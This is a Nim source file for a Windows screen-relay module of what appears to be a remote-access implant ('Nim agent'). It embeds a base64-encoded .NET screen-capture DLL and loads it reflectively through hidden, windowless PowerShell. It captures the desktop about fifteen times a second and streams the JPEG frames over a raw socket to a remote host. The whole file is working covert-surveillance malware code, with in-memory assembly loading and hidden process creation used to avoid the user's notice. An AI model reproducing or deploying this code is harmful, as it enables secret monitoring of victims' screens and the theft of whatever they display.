## vnc.nim — VNC PowerShell-based screen relay for Nim agent (Windows only)
when defined(windows):
  import winim/lean
  import std/[strutils, base64, locks]

  const VNC_FRAME = 0x01'u8
  const VNC_INFO  = 0x02'u8
  const VNC_PONG  = 0x03'u8
  const VNC_STOP  = 0x14'u8
  const VNC_PING  = 0x15'u8

  var gVncStop:    bool = false
  var gVncRunning: bool = false
  var gVncLock:    Lock
  initLock(gVncLock)

  proc wsSendAll(s: SOCKET, buf: openArray[byte]): bool =
    var pos = 0
    while pos < buf.len:
      let n = send(s, cast[ptr char](unsafeAddr buf[pos]), int32(buf.len - pos), 0)
      if n <= 0: return false
      pos += n
    true

  proc wsRecvAll(s: SOCKET, buf: var openArray[byte]): bool =
    var pos = 0
    while pos < buf.len:
      let n = recv(s, cast[ptr char](addr buf[pos]), int32(buf.len - pos), 0)
      if n <= 0: return false
      pos += n
    true

  proc tcpSendFrame(s: SOCKET, typ: uint8, payload: openArray[byte]) =
    var hdr: array[5, byte]
    let plen = payload.len.uint32
    hdr[0] = typ
    hdr[1] = uint8(plen and 0xFF)
    hdr[2] = uint8((plen shr 8) and 0xFF)
    hdr[3] = uint8((plen shr 16) and 0xFF)
    hdr[4] = uint8((plen shr 24) and 0xFF)
    discard wsSendAll(s, hdr)
    if plen > 0: discard wsSendAll(s, payload)

  type InputArgs = object
    sock: SOCKET

  proc vncInputReader(a: InputArgs) {.thread.} =
    let s = a.sock
    while true:
      withLock(gVncLock):
        if gVncStop: break
      var hdr: array[5, byte]
      if not wsRecvAll(s, hdr): break
      let typ = hdr[0]
      let plen = uint32(hdr[1]) or (uint32(hdr[2]) shl 8) or
                 (uint32(hdr[3]) shl 16) or (uint32(hdr[4]) shl 24)
      if plen > 0:
        var buf = newSeq[byte](plen)
        if not wsRecvAll(s, buf): break
      case typ
      of VNC_STOP:
        withLock(gVncLock): gVncStop = true
        break
      of VNC_PING:
        let empty: array[0, byte] = []
        tcpSendFrame(s, VNC_PONG, empty)
      else: discard

  type VncArgs = object
    host: string
    port: int
    quality: int

  const capDllB64 = "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bABsAAAAAAAkAAIAAQBQAHIAbwBkAHUAYwB0AE4AYQBtAGUAAAAAACAAAAAoAAIAAQBQAHIAbwBkAHUAYwB0AFYAZQByAHMAaQBvAG4AAAAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAwAAACANQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA="

  proc vncSessionThread(a: VncArgs) {.thread.} =
    var wsd: WSADATA
    discard WSAStartup(WORD(0x0202), addr wsd)

    let sock = socket(int32(AF_INET), int32(SOCK_STREAM), int32(IPPROTO_TCP))
    if sock == INVALID_SOCKET:
      withLock(gVncLock): gVncRunning = false
      return

    var sa: sockaddr_in
    sa.sin_family = int16(AF_INET)
    sa.sin_port = htons(uint16(a.port))
    var hostCS = a.host & "\x00"
    sa.sin_addr.S_addr = inet_addr(addr hostCS[0])
    if connect(sock, cast[ptr sockaddr](addr sa), int32(sizeof(sa))) != 0:
      discard closesocket(sock)
      withLock(gVncLock): gVncRunning = false
      return

    var inputThr: Thread[InputArgs]
    createThread(inputThr, vncInputReader, InputArgs(sock: sock))

    let psScript = "$q=" & $a.quality & ";" &
      "Add-Type -AssemblyName System.Drawing;" &
      "$d=[Convert]::FromBase64String('" & capDllB64 & "');" &
      "$a=[Reflection.Assembly]::Load($d);" &
      "$SC=$a.GetType('SC');" &
      "while($true){" &
      "try{" &
      "$bmp=$SC.GetMethod('Cap').Invoke($null,$null);" &
      "$ms=[IO.MemoryStream]::new();" &
      "$ec=[Drawing.Imaging.ImageCodecInfo]::GetImageEncoders()|Where-Object{$_.MimeType-eq'image/jpeg'};" &
      "$ep=[Drawing.Imaging.EncoderParameters]::new(1);" &
      "$ep.Param[0]=[Drawing.Imaging.EncoderParameter]::new([Drawing.Imaging.Encoder]::Quality,[long]$q);" &
      "$bmp.Save($ms,$ec,$ep);" &
      "$w=$bmp.Width;$h=$bmp.Height;$b=[Convert]::ToBase64String($ms.ToArray());" &
      "[Console]::Out.WriteLine($w.ToString()+','+$h.ToString()+','+$b);" &
      "$bmp.Dispose();$ms.Dispose()" &
      "}catch{};" &
      "Start-Sleep -Milliseconds 66}"
    let psCmd = "powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -Command \"" & psScript & "\""

    var saPipe: SECURITY_ATTRIBUTES
    saPipe.nLength = DWORD(sizeof(SECURITY_ATTRIBUTES))
    saPipe.bInheritHandle = TRUE
    saPipe.lpSecurityDescriptor = nil

    var hRead, hWrite: HANDLE
    if CreatePipe(addr hRead, addr hWrite, addr saPipe, 0) == 0:
      discard closesocket(sock)
      withLock(gVncLock): gVncRunning = false
      return

    var si: STARTUPINFOA
    var pi: PROCESS_INFORMATION
    zeroMem(addr si, sizeof(si))
    si.cb = DWORD(sizeof(si))
    si.dwFlags = STARTF_USESTDHANDLES or STARTF_USESHOWWINDOW
    si.hStdOutput = hWrite
    si.hStdError  = hWrite
    si.wShowWindow = SW_HIDE

    var cmdBuf = newString(psCmd.len + 1)
    copyMem(addr cmdBuf[0], unsafeAddr psCmd[0], psCmd.len)
    cmdBuf[psCmd.len] = '\0'

    let created = CreateProcessA(nil, addr cmdBuf[0], nil, nil, TRUE,
                                  CREATE_NO_WINDOW, nil, nil, addr si, addr pi)
    discard CloseHandle(hWrite)
    if created == 0:
      discard CloseHandle(hRead)
      discard closesocket(sock)
      withLock(gVncLock): gVncRunning = false
      return
    discard CloseHandle(pi.hThread)

    var lineBuf = newString(8 * 1024 * 1024)
    var linePos = 0
    var sentInfo = false

    block relay:
      while true:
        withLock(gVncLock):
          if gVncStop: break relay

        var avail: DWORD = 0
        if PeekNamedPipe(hRead, nil, 0, nil, addr avail, nil) == 0: break relay
        if avail == 0:
          Sleep(10); continue

        let toRead = min(avail, DWORD(lineBuf.len - linePos - 1))
        var nr: DWORD = 0
        if ReadFile(hRead, addr lineBuf[linePos], toRead, addr nr, nil) == 0 or nr == 0:
          break relay
        linePos += int(nr)
        lineBuf[linePos] = '\0'

        var nlPos = lineBuf.find('\n', 0)
        while nlPos >= 0 and nlPos < linePos:
          let line = lineBuf[0..<nlPos].strip()
          let consumed = nlPos + 1
          for i in 0..<(linePos - consumed):
            lineBuf[i] = lineBuf[i + consumed]
          linePos -= consumed
          nlPos = lineBuf.find('\n', 0)

          let commaPos1 = line.find(',')
          if commaPos1 < 0: continue
          let commaPos2 = line.find(',', commaPos1 + 1)
          if commaPos2 < 0: continue

          let w = line[0..<commaPos1].strip().parseInt()
          let h = line[commaPos1+1..<commaPos2].strip().parseInt()
          let b64 = line[commaPos2+1..^1].strip()

          var jpegBytes: seq[byte]
          try:
            let dec = base64.decode(b64)
            jpegBytes = cast[seq[byte]](dec)
          except: continue

          if jpegBytes.len > 0:
            if not sentInfo:
              let info = "{\"w\":" & $w & ",\"h\":" & $h & "}"
              tcpSendFrame(sock, VNC_INFO, cast[seq[byte]](info))
              sentInfo = true
            var frame = newSeq[byte](4 + jpegBytes.len)
            frame[0] = uint8(w and 0xFF); frame[1] = uint8((w shr 8) and 0xFF)
            frame[2] = uint8(h and 0xFF); frame[3] = uint8((h shr 8) and 0xFF)
            copyMem(addr frame[4], addr jpegBytes[0], jpegBytes.len)
            tcpSendFrame(sock, VNC_FRAME, frame)

    discard TerminateProcess(pi.hProcess, 0)
    discard CloseHandle(pi.hProcess)
    discard CloseHandle(hRead)
    joinThread(inputThr)
    discard closesocket(sock)
    withLock(gVncLock): gVncRunning = false

  var gVncArgs: VncArgs

  proc vncThreadEntry(p: LPVOID): DWORD {.stdcall.} =
    vncSessionThread(gVncArgs)
    0

  proc vncStart*(host: string, port: int, quality: int) =
    withLock(gVncLock):
      if gVncRunning: return
      gVncRunning = true
      gVncStop    = false
    gVncArgs = VncArgs(host: host, port: port, quality: quality)
    var tid: DWORD = 0
    let ht = CreateThread(nil, 0, vncThreadEntry, nil, 0, addr tid)
    if ht != 0: discard CloseHandle(ht)
    else: withLock(gVncLock): gVncRunning = false

  proc vncStop*() =
    withLock(gVncLock): gVncStop = true
